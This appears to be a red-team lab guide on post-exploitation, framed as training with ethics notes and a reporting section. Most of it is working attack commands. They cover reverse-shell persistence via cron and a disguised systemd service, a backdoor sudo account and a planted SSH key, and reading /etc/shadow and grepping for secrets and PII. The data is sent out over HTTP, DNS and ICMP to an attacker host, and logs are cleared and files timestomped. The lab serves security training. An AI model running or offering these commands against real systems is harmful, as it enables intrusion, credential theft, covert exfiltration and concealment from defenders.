## 📖 Background

Post-exploitation is the phase where access is turned into impact. In a real engagement, the goal is not just to get root — it is to demonstrate what an attacker could do with that access. This means finding sensitive data (customer records, intellectual property, credentials), proving it can be extracted, and showing how persistent access could be maintained. Responsible red teams document everything and leave the target in its original state.

Key concepts:
- **Persistence** — Mechanisms that survive reboots and maintain access (cron jobs, SSH keys, services)
- **Data Discovery** — Finding valuable files, databases, credentials, and secrets on compromised systems
- **Exfiltration** — Moving data out of the target network through allowed channels
- **Covert Channels** — Using unexpected protocols (DNS, ICMP, HTTP headers) to transfer data
- **Anti-Forensics** — Techniques to remove evidence of compromise (log clearing, timestomping)
- **Reporting** — Translating technical findings into business-relevant risk assessments

## 🔬 Lab Instructions

### Phase 1: Establishing Persistence

1. Add an SSH authorized key for persistent access:
   ```bash
   mkdir -p ~/.ssh
   echo "ssh-ed25519 AAAA... attacker@grimoire" >> ~/.ssh/authorized_keys
   chmod 600 ~/.ssh/authorized_keys
   ```
2. Create a cron-based reverse shell for callback persistence:
   ```bash
   (crontab -l 2>/dev/null; echo "*/15 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'") | crontab -
   ```
3. Create a systemd service for more robust persistence:
   ```bash
   cat > /etc/systemd/system/sysupdate.service << 'EOF'
   [Unit]
   Description=System Update Service
   After=network.target
   [Service]
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'
   Restart=always
   RestartSec=60
   [Install]
   WantedBy=multi-user.target
   EOF
   systemctl enable sysupdate.service
   ```
4. Create a backdoor user account (use sparingly — easily detected):
   ```bash
   useradd -m -s /bin/bash -G sudo sysadmin
   echo "sysadmin:ComplexPass123!" | chpasswd
   ```
5. Document all persistence mechanisms with removal instructions

### Phase 2: Data Discovery

1. Search for sensitive files by name pattern:
   ```bash
   find / -name "*.conf" -o -name "*.bak" -o -name "*.sql" -o -name "*.key" -o -name "*.pem" 2>/dev/null
   ```
2. Look for credentials in common locations:
   ```bash
   cat /etc/shadow
   find / -name "wp-config.php" -o -name ".env" -o -name "config.yml" 2>/dev/null
   grep -ri "password\|api_key\|secret" /var/www/ /opt/ /home/ 2>/dev/null | head -50
   ```
3. Enumerate databases and extract schemas:
   ```bash
   mysql -u root -e "SHOW DATABASES; SELECT user,host FROM mysql.user;"
   ```
4. Search for personally identifiable information (PII):
   ```bash
   grep -rEi "[0-9]{3}-[0-9]{2}-[0-9]{4}" /var/www/ 2>/dev/null   # SSN pattern
   grep -rEi "[a-z0-9.]+@[a-z0-9.]+" /var/www/ 2>/dev/null          # Email pattern
   ```
5. Identify high-value targets: source code repositories, backup files, internal documentation
6. Catalog all findings with file paths, content type, and sensitivity rating

### Phase 3: Data Exfiltration Techniques

1. Simple file transfer over HTTP:
   ```bash
   # Attacker: start a listener
   python3 -m http.server 8000
   # Target: send the file
   curl -X POST -F "file=@/tmp/sensitive_data.tar.gz" http://10.10.10.5:8000/upload
   ```
2. Encode data in base64 for text-based transfer:
   ```bash
   base64 /etc/shadow > /tmp/encoded.txt
   curl http://10.10.10.5:8000/exfil -d @/tmp/encoded.txt
   ```
3. Encrypt data before exfiltration:
   ```bash
   tar czf - /var/www/data/ | openssl enc -aes-256-cbc -pass pass:GrimoireExfil -out /tmp/data.enc
   ```
4. Use DNS as a covert exfiltration channel:
   ```bash
   # Encode and send data as DNS queries
   cat /etc/shadow | xxd -p | fold -w 60 | while read line; do
       nslookup "$line.exfil.attacker.com" 10.10.10.5
   done
   ```
5. Transfer files through ICMP (if DNS and HTTP are monitored):
   ```bash
   # Concept: encode data into ICMP echo request payloads
   xxd -p /tmp/secret.txt | while read -n 32 chunk; do
       ping -c 1 -p "$chunk" 10.10.10.5
   done
   ```
6. Use SCP/SFTP for direct encrypted transfers when stealth is less important:
   ```bash
   scp /tmp/data.enc attacker@10.10.10.5:/tmp/loot/
   ```

### Phase 4: Anti-Forensics Awareness

> **⚠️ Ethics Note:** Understanding anti-forensics is essential for both red and blue teams. Red teams must know what artifacts they leave behind. Blue teams must know where to look. In authorized engagements, always follow the rules of engagement regarding cleanup.

1. Understand what artifacts an attacker leaves behind:
   - Shell history (`~/.bash_history`)
   - Authentication logs (`/var/log/auth.log`)
   - Command audit logs (`/var/log/syslog`)
   - File modification timestamps
   - Network connection logs
2. Learn timestomping concepts (modifying file timestamps):
   ```bash
   touch -t 202301011200 /tmp/backdoor.sh   # Set to a past date
   ```
3. Understand log clearing (for awareness — in real engagements, follow ROE):
   ```bash
   # What an attacker might do:
   echo "" > /var/log/auth.log
   history -c && history -w
   ```
4. Learn about process hiding and rootkit concepts (study only)
5. Document which artifacts your engagement left behind for the report

### Phase 5: Engagement Reporting

1. Structure your penetration testing report:
   - **Executive Summary** — Business impact in non-technical language
   - **Scope and Methodology** — What was tested and how
   - **Findings** — Each vulnerability with evidence, severity, and remediation
   - **Attack Narrative** — Step-by-step story of the engagement
   - **Recommendations** — Prioritized remediation steps
2. For each finding, include:
   ```
   Title: SQL Injection in Search Parameter
   Severity: Critical
   CVSS: 9.8
   Affected Asset: https://grimoire-target.lab/search
   Evidence: [screenshot/command output]
   Impact: Full database extraction including user credentials
   Remediation: Use parameterized queries; implement input validation
   ```
3. Include all persistence mechanisms and confirm their removal
4. Provide a network diagram showing the complete attack path
5. Deliver recommendations ordered by risk reduction impact
